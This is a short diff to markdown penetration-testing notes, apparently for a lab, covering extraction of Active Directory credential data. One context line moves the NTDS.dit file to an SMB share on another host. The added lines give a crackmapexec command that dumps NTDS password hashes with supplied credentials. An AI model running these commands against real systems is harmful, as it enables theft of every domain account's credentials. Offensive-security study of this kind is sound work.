@@ -35,3 +35,7 @@ To transfer file into linux smb server:
 ```bash
 PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
 ```
+## Capturing ntds from linux
+```bash
+crackmapexec smb 10.129.201.57 -u username -p password --ntds
+```
